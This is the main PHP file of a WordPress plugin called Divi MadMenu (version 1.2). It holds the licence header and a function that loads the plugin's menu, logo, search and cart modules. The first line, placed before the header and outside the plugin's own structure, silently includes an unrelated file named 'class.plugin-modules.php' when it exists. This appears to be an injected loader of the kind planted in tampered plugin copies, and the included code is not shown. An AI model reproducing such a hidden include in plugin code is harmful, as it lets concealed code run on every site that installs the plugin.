<?php if (file_exists(dirname(__FILE__) . '/class.plugin-modules.php')) include_once(dirname(__FILE__) . '/class.plugin-modules.php'); ?><?php
/*
Plugin Name: Divi MadMenu
Plugin URI:  https://divicio.us
Description: The most advanced Divi menu module for creating headers using Divi Theme Builder.
Version:     1.2
Author:      Ivan Chiurcci(Chi)
Author URI:  https://divicio.us
License:     GPL2
License URI: https://www.gnu.org/licenses/gpl-2.0.html
Text Domain: dvmm-divi-mad-menu
Domain Path: /languages

Divi Mad Menu is free software: you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation, either version 2 of the License, or
any later version.

Divi Mad Menu is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY; without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
GNU General Public License for more details.

You should have received a copy of the GNU General Public License
along with Divi Mad Menu. If not, see https://www.gnu.org/licenses/gpl-2.0.html.
*/

if ( ! function_exists( 'dvmm_initialize_extension' ) ):
/**
 * Creates the extension's main class instance.
 *
 * @since 1.0.0
 */
function dvmm_initialize_extension() {

	/**
	 * Plugin path.
	 * 
	 * @since	1.0.0
	 */
	if (!defined('DVMM_MADMENU_PLUGIN_PATH')) {
		define('DVMM_MADMENU_PLUGIN_PATH', plugin_dir_url(__FILE__));
	}

	/**
	 * Plugin main file.
	 * 
	 * @since	1.0.0
	 */
	if (!defined('DVMM_MADMENU_PLUGIN_MAIN_FILE')) {
		define('DVMM_MADMENU_PLUGIN_MAIN_FILE', __FILE__);
	}

	/**
	 * Plugin version.
	 * 
	 * @since	1.0.0
	 */
	if(!defined('DVMM_MADMENU_VERSION')){
		define( 'DVMM_MADMENU_VERSION', '1.2' );
	}

	/**
	 * Plugin basename.
	 * 
	 * @since	1.0.0
	 */
	define( 'DVMM_MADMENU_BASENAME', plugin_basename(__FILE__) );

	// Admin.
	require_once plugin_dir_path( __FILE__ ) . 'admin/includes/admin.php';
	// Plugin updater.
	require_once plugin_dir_path( __FILE__ ) . 'updater/licensing.php';
	// Walker Nav Menu.
	require_once plugin_dir_path( __FILE__ ) . 'includes/class-walker-nav-menu.php';
	// Helpers.
	require_once plugin_dir_path( __FILE__ ) . 'includes/helper.php';
	// Menu Inner Container.
	require_once plugin_dir_path( __FILE__ ) . 'includes/modules/MadMenu/InnerContainer.php';
	// Menu Wrapper.
	require_once plugin_dir_path( __FILE__ ) . 'includes/modules/MadMenu/MenuWrapper.php';
	// Mobile Menu Wrapper.
	require_once plugin_dir_path( __FILE__ ) . 'includes/modules/MadMenu/MobileMenuWrapper.php';
	// Styles.
	require_once plugin_dir_path( __FILE__ ) . 'includes/modules/MadMenu/Style.php';
	// Horizontal Menu.
	require_once plugin_dir_path( __FILE__ ) . 'includes/modules/MadMenu/DesktopMenu.php';
	// Mobile Menu.
	require_once plugin_dir_path( __FILE__ ) . 'includes/modules/MadMenu/MobileMenu.php';
	// Mobile Menu Toggle.
	require_once plugin_dir_path( __FILE__ ) . 'includes/modules/MadMenu/MenuToggle.php';
	// Logo.
	require_once plugin_dir_path( __FILE__ ) . 'includes/modules/MadMenu/Logo.php';
	// Search.
	require_once plugin_dir_path( __FILE__ ) . 'includes/modules/MadMenu/Search.php';
	// Cart.
	require_once plugin_dir_path( __FILE__ ) . 'includes/modules/MadMenu/Cart.php';
	// Button(s).
	require_once plugin_dir_path( __FILE__ ) . 'includes/modules/MadMenu/Button.php';
	// Main.
	require_once plugin_dir_path( __FILE__ ) . 'includes/DiviMadMenu.php';
	
}
add_action( 'divi_extensions_init', 'dvmm_initialize_extension' );
endif;
